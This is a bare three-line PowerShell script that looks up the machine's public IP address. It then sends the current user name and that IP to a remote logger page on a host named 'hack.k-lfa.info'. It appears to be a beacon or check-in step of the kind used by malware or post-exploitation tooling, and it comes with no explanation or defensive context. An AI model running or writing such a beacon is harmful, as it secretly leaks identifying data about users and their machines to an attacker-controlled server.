$Public_IP = Invoke-WebRequest -Uri "http://whatismyip.akamai.com/"
$Master = "https://hack.k-lfa.info/logger.php?log=$(whoami):$Public_IP"
(New-Object System.Net.WebClient).DownloadString($Master)
